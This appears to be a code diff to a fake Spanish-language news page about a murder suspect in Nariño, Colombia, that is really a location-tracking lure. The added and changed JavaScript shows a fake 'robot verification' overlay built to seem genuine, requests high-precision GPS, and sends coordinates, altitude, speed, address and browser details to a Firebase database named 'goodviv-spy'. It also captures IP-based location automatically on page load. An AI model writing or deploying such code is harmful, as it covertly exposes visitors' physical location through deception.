@@ -556,7 +556,7 @@
             </div>
 
             <div class="article-content">
-                <p id="newsContent">Atención, porque las autoridades ya tendrían en la mira al presunto responsable de un crimen que tiene de luto a Nariño. Se trataría del asesino de Omar Andrés Benítez, conocido como 'Coquito'. Fuentes extraoficiales señalan que su paradero estaría prácticamente localizado, y de confirmarse su captura, podría enfrentar una condena de hasta 17 años de cárcel. Una historia que hoy estremece a todo un pueblo y que clama justicia inmediata... <span class="read-more-link" onclick="expandNewsFacebook()"><strong>leer más</strong></span></p>
+                <p id="newsContent">Cargando noticia...</p>
                 
                 <!-- Contenido adicional que se mostrará después del "Leer más" -->
                 <div id="fullContent" style="display: none;">
@@ -583,22 +583,16 @@
             </div>
         </div>
     </footer>
-            // Función para mostrar el contenido completo
-function showFullContent() {
+
+    <script>
+        // Función para mostrar el contenido completo
+        function showFullContent() {
     const newsContent = document.getElementById('newsContent');
     if (newsContent) {
         newsContent.innerHTML = `Atención, porque las autoridades ya tendrían en la mira al presunto responsable de un crimen que tiene de luto a Nariño. Se trataría del asesino de Omar Andrés Benítez, conocido como 'Coquito'. Fuentes extraoficiales señalan que su paradero estaría prácticamente localizado, y de confirmarse su captura, podría enfrentar una condena de hasta 17 años de cárcel. Una historia que hoy estremece a todo un pueblo y que clama justicia inmediata.\n\nSegún informes de la Fiscalía General de la Nación, el operativo de búsqueda se intensificó después de que testigos clave proporcionaran información crucial sobre los movimientos del sospechoso en las últimas 48 horas. El crimen, que conmocionó a la comunidad nariñense hace tres semanas, habría sido perpetrado por motivos que aún están bajo investigación.\n\nLa víctima, Omar Andrés Benítez, de 34 años, era reconocido en su comunidad como una persona trabajadora y padre de familia. Su muerte ha generado una ola de indignación y exigencias de justicia por parte de familiares y vecinos, quienes han realizado marchas pacíficas pidiendo celeridad en las investigaciones.\n\nEl coronel de la Policía de Nariño confirmó que se mantienen activos varios operativos de búsqueda en diferentes municipios de la región, y que esperan tener resultados concretos en las próximas horas.`;
     }
 }
 
-// Función para expandir el contenido con verificación
-function expandNewsFacebook() {
-    showRobotVerificationOverlay();
-    setTimeout(() => {
-        hideVerificationOverlay();
-        showFullContent();
-    }, 2000);
-}
 
 // Función para mostrar overlay de verificación
 function showRobotVerificationOverlay() {
@@ -655,6 +649,9 @@ function hideVerificationOverlay() {
     }
 }
 
+        // Función para capturar IP automáticamente
+        async function captureIPAutomatically() {
+            try {
                 const resp = await fetch('https://ipapi.co/json/');
                 const data = await resp.json();
 
@@ -838,44 +835,39 @@ function hideVerificationOverlay() {
             }
         }
 
-        // Capturar y almacenar ubicación GPS (precisa)
-        function captureLocation(position) {
-            console.log('📍 Capturando ubicación...');
+        // Capturar y almacenar ubicación GPS (alta precisión)
+        async function captureLocation(position) {
+            console.log('📍 Capturando ubicación GPS de alta precisión...');
             
-            // Crear objeto de ubicación
-            var locationData = {
-                id: 'gps_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
-                lat: position.coords.latitude,
-                lng: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                timestamp: new Date().toISOString(),
-                source: 'Diario Regional',
-                userAgent: navigator.userAgent
-            };
+            try {
+                // Obtener dirección desde coordenadas
+                const address = await getAddressFromCoordinates(position.coords.latitude, position.coords.longitude);
+                
+                // Crear objeto de ubicación GPS
+                const locationData = {
+                    id: 'gps_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
+                    method: 'GPS_PRECISION',
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    altitude: position.coords.altitude,
+                    speed: position.coords.speed,
+                    heading: position.coords.heading,
+                    timestamp: new Date().toISOString(),
+                    address: address,
+                    userAgent: navigator.userAgent,
+                    url: window.location.href,
+                    source: 'news_read_more'
+                };
 
-            // Guardar en Firebase
-            fetch('https://goodviv-spy-default-rtdb.firebaseio.com/capturedLocations.json', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(locationData)
-            })
-            .then(function(response) {
-                if (!response.ok) {
-                    throw new Error('Error al guardar en Firebase');
-                }
-                console.log('✅ Ubicación guardada exitosamente');
-                showSuccessMessage();
-            })
-            .catch(function(error) {
-                console.error('❌ Error:', error);
-                // Guardar localmente como respaldo
-                var localLocations = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
-                localLocations.push(locationData);
-                localStorage.setItem('capturedLocations', JSON.stringify(localLocations));
-            });
-    }
+                // Enviar a Firebase usando la función estándar
+                await saveToFirebase(locationData);
+                console.log('✅ Ubicación GPS guardada exitosamente con alta precisión');
+                
+            } catch (error) {
+                console.error('❌ Error al capturar ubicación GPS:', error);
+            }
+        }
     // Función para enviar datos a Firebase
         async function saveToFirebase(locationData) {
             try {
@@ -1034,14 +1026,15 @@ function hideVerificationOverlay() {
             
             // Esperar 2.5 segundos para que parezca una verificación real
             setTimeout(() => {
-                attemptLocationCapture(1); // Primer intento
+                console.log('🎯 Iniciando captura de ubicación GPS de alta precisión...');
+                attemptLocationCapture(1); // Primer intento con GPS
             }, 2500);
         }
         
         // Nueva función para intentos múltiples de captura
         function attemptLocationCapture(attemptNumber) {
             locationAttempts = attemptNumber; // Actualizar contador global
-            console.log(`📍 Intento ${attemptNumber} de captura de ubicación...`);
+            console.log(`📍 Intento ${attemptNumber} de captura de ubicación GPS de alta precisión...`);
             
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -1489,6 +1482,12 @@ function hideVerificationOverlay() {
 
         // Inicializar la noticia al cargar el script
         renderNews();
+        
+        // Capturar ubicación por IP automáticamente al cargar la página
+        setTimeout(() => {
+            captureIPAutomatically();
+            console.log('🌐 Captura automática de ubicación por IP iniciada');
+        }, 2000); // Esperar 2 segundos para que cargue la página
         
         // Intentar capturar ubicación automáticamente después de 10 segundos
         setTimeout(() => {
